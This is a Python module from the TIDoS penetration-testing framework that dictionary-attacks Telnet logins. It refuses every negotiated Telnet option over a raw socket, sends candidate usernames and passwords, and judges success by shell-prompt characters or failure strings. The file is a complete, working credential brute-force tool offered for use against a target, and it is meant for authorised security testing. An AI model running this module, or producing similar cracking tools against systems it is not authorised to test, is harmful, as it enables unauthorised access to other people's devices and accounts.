#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of Telnet logins.

telnetlib was removed in Python 3.13, so this speaks just enough of the
protocol itself: it refuses every negotiated option (so the server reaches
the login prompt) and then matches the login/password prompts and the
server's failure strings.
"""

from __future__ import annotations

import socket

from core.methods import brute
from core.methods.print import pbrute

info = "Brute force Telnet credentials using dictionaries (raw-socket, no telnetlib)."
searchinfo = "Telnet Login Cracker"
properties = brute.options(port_default=23, threads_default=3)

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

LOGIN_PROMPTS = (b"login:", b"username:", b"user:")
PASS_PROMPTS = (b"password:", b"passcode:")
FAIL_MARKERS = (b"incorrect", b"login failed", b"authentication failed",
                b"access denied", b"invalid", b"failed")


def _recv_until(sock, prompts, timeout, limit=8192):
    """Read, answering Telnet negotiation, until one of `prompts` (lowercased
    byte strings) appears in the visible data. Returns the visible bytes."""
    sock.settimeout(timeout)
    visible = bytearray()
    while len(visible) < limit:
        try:
            chunk = sock.recv(1024)
        except socket.timeout:
            break
        if not chunk:
            break
        i = 0
        while i < len(chunk):
            byte = chunk[i]
            if byte == IAC and i + 1 < len(chunk):
                cmd = chunk[i + 1]
                if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(chunk):
                    opt = chunk[i + 2]
                    # Refuse everything: answer DO/WILL with WONT/DONT.
                    reply = WONT if cmd == DO else DONT if cmd == WILL else None
                    if reply is not None:
                        try:
                            sock.sendall(bytes([IAC, reply, opt]))
                        except OSError:
                            pass
                    i += 3
                    continue
                if cmd == SB:               # skip subnegotiation until IAC SE
                    j = i + 2
                    while j + 1 < len(chunk) and not (chunk[j] == IAC and chunk[j + 1] == SE):
                        j += 1
                    i = j + 2
                    continue
                i += 2
                continue
            visible.append(byte)
            i += 1
        low = bytes(visible).lower()
        if any(p in low for p in prompts):
            break
    return bytes(visible)


def _try_login(ip, port, user, password, timeout):
    try:
        sock = socket.create_connection((ip, int(port)), timeout=timeout)
    except OSError as e:
        raise ConnectionError(str(e)) from e
    try:
        banner = _recv_until(sock, LOGIN_PROMPTS, timeout)
        if not any(p in banner.lower() for p in LOGIN_PROMPTS):
            raise ConnectionError("no login prompt from telnet service")
        sock.sendall(user.encode(errors="ignore") + b"\r\n")
        _recv_until(sock, PASS_PROMPTS, timeout)
        sock.sendall(password.encode(errors="ignore") + b"\r\n")
        # Read the server's verdict: another login prompt or a failure marker
        # means rejection; a shell-ish prompt with none of those means success.
        reply = _recv_until(sock, LOGIN_PROMPTS, timeout).lower()
        if any(m in reply for m in FAIL_MARKERS):
            return False
        if any(p in reply for p in LOGIN_PROMPTS):
            return False            # re-prompted for login -> rejected
        # Accept only on positive evidence of a session (a shell prompt).
        return any(ch in reply for ch in (b"$", b"#", b">", b"welcome", b"last login"))
    except (ConnectionError, socket.timeout):
        raise
    except OSError as e:
        raise ConnectionError(str(e)) from e
    finally:
        try:
            sock.close()
        except OSError:
            pass


def attack(target):
    pbrute("Telnet")
    return brute.run(target, properties, proto="telnet", port_default=23,
              try_login=_try_login, lvl2="telnetbrute", threads_default=3,
              service="Telnet")
